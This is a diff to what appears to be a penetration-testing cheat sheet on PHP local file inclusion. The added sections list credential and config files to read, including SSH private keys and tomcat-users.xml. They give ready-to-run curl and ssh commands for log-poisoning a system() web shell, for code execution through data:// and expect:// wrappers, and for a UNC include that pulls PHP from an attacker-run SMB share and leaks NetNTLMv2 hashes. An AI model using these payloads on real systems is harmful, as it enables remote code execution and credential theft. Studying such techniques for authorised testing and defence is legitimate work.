@@ -16,6 +16,11 @@ Linux:   /etc/passwd  /etc/hostname  /proc/self/status  /proc/self/cmdline
          /proc/self/environ  /proc/self/cwd/index.php
          /var/www/html/.env  /var/www/html/config.php  /var/www/html/wp-config.php
 Windows: C:\Windows\win.ini  C:\inetpub\wwwroot\web.config
+         C:\Windows\System32\drivers\etc\hosts  C:\xampp\apache\conf\httpd.conf
+         C:\xampp\apache\logs\access.log  C:\Users\<USER>\.ssh\id_rsa
+SSH key: /home/<USER>/.ssh/id_rsa  /root/.ssh/id_rsa   (chmod 600 before use)
+Config:  /etc/apache2/sites-enabled/000-default.conf
+         /opt/tomcat/conf/tomcat-users.xml
 ```
 
 ## Filtered traversal
@@ -56,3 +61,32 @@ curl -sS -X POST 'http://<IP>/index.php?page=php://input&cmd=id' \
   --data-binary '<?php system($_GET["cmd"]); ?>'
 ```
 - Confirm with `id` output; literal PHP source = file read, not execution.
+
+## SSH and FTP log poisoning
+Readable `auth.log`: log in with PHP as the username, then include the log.
+
+```bash
+ssh '<?php system($_GET["cmd"]); ?>'@<IP>
+curl -sG 'http://<IP>/index.php' \
+  --data-urlencode 'page=../../../../var/log/auth.log' --data-urlencode 'cmd=id'
+```
+- Same idea: `/var/log/vsftpd.log` (FTP username), `/var/log/mail.log` (SMTP). Needs the log readable by the web user.
+- The log must be intact: one broken PHP tag poisons it until rotated.
+
+## Wrappers
+```bash
+curl -sG 'http://<IP>/index.php' --data-urlencode 'page=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg=='
+curl -sG 'http://<IP>/index.php' --data-urlencode 'page=expect://id'
+```
+- `data://` needs `allow_url_include`; `expect://` needs the `expect` extension (rare).
+- An app-appended extension breaks `data://`; `php://filter` source reads still work.
+
+## Windows target: UNC include
+A Windows PHP host resolves a UNC path as a file (no `allow_url_include` needed) if outbound SMB works.
+
+```bash
+sudo impacket-smbserver -smb2support share /path/to/dir
+curl -sG 'http://<IP>/index.php' --data-urlencode 'page=\\<KALI>\share\probe.php'
+```
+- A connection to Kali with no code run = fetched but not interpreted, or the share denied guest: use [authenticated SMB](../foothold/file-transfer.md#authenticated-smb-share).
+- Also leaks a NetNTLMv2 for the web service account → [crack, not relay](../windows/ntlm.md).
